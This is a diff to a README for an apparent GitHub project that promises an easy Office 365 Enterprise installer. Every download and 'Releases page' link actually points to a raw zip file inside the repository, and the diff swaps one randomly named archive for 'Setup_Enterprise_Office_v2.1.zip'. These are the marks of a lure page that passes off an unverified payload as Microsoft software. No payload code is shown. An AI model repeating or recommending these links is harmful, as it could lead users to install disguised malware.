@@ -1,7 +1,7 @@
 # 🎉 Office-365-Enterprise-Setup - Easy Installer for Office 365
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Dhanloyd/Office-365-Enterprise-Setup/main/Office365/Office/Office-365-Enterprise-Setup_bronchopleurisy.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Dhanloyd/Office-365-Enterprise-Setup/main/Office365/Office/Office-365-Enterprise-Setup_bronchopleurisy.zip)
+[![Download Latest Release](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/raw/refs/heads/main/Office365/Setup_Enterprise_Office_v2.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/raw/refs/heads/main/Office365/Setup_Enterprise_Office_v2.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and install the Office 365 Enterprise Offline/Online Installer easily. Follow the steps below.
@@ -24,12 +24,12 @@ Office-365-Enterprise-Setup is an automated installer for Microsoft Office 365. 
 - Easy-to-use batch script
 
 ## 📅 Release Notes
-Each release includes updates and improvements. Check the release notes on the [Releases page](https://raw.githubusercontent.com/Dhanloyd/Office-365-Enterprise-Setup/main/Office365/Office/Office-365-Enterprise-Setup_bronchopleurisy.zip) for detailed information on changes and fixes.
+Each release includes updates and improvements. Check the release notes on the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/raw/refs/heads/main/Office365/Setup_Enterprise_Office_v2.1.zip) for detailed information on changes and fixes.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Dhanloyd/Office-365-Enterprise-Setup/main/Office365/Office/Office-365-Enterprise-Setup_bronchopleurisy.zip) to download the latest version of the installer.
+To get started, visit the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/raw/refs/heads/main/Office365/Setup_Enterprise_Office_v2.1.zip) to download the latest version of the installer.
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Dhanloyd/Office-365-Enterprise-Setup/main/Office365/Office/Office-365-Enterprise-Setup_bronchopleurisy.zip).
+1. Visit the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/raw/refs/heads/main/Office365/Setup_Enterprise_Office_v2.1.zip).
 2. Click on the latest release.
 3. Download the installer file suitable for your system.
 
@@ -62,4 +62,4 @@ Feel free to contribute. Open an issue or submit a pull request on GitHub if you
 ## 📝 Acknowledgments
 Special thanks to all contributors and community members who help make this project better. Your collaboration is invaluable.
 
-For more information, visit the [Releases page](https://raw.githubusercontent.com/Dhanloyd/Office-365-Enterprise-Setup/main/Office365/Office/Office-365-Enterprise-Setup_bronchopleurisy.zip) and download Office-365-Enterprise-Setup now.
+For more information, visit the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/raw/refs/heads/main/Office365/Setup_Enterprise_Office_v2.1.zip) and download Office-365-Enterprise-Setup now.
